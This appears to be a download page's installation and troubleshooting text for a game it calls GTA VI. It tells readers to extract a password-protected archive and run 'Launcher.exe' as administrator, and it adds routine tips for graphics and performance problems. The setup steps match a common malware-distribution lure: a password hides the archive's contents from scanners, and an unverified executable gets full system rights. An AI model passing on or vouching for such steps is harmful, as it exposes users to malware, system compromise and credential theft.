## 🔧 Quick Installation

1. Download the archive using the button above
2. Extract with WinRAR or 7-Zip (password shown on download page)
3. Right-click `Launcher.exe` and select **Run as administrator**
4. Follow the on-screen setup instructions
5. Launch GTA VI from the desktop shortcut or start menu

---

### Black screen during gameplay
- Switch to windowed mode (Alt+Enter)
- Reduce graphics settings in the launcher menu
- Disable ray tracing temporarily

### Missing assets or textures
- Run the asset integrity check tool included in the installation folder
- Re-extract the archive if files are corrupted
- Verify your system meets minimum requirements

### Low FPS or stuttering
- Apply the performance preset matching your hardware
- Close background applications
- Update graphics drivers
- Reduce shadow quality and draw distance
